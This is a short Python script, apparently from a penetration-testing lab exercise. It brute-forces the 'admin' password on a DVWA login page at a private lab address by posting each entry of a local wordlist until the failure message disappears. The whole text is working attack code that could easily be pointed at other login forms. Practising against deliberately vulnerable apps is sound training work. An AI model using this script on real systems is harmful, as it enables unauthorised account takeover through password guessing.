#!/usr/bin/env python

import requests

target_url = "http://10.0.2.11/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open("/home/kali/vs/crawler/password.list", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        
        # Decode the response content
        if "Login failed" not in response.text:
            print(f"Password found: {word}")
            exit()

print("[+] Sorry, password could not be found.")
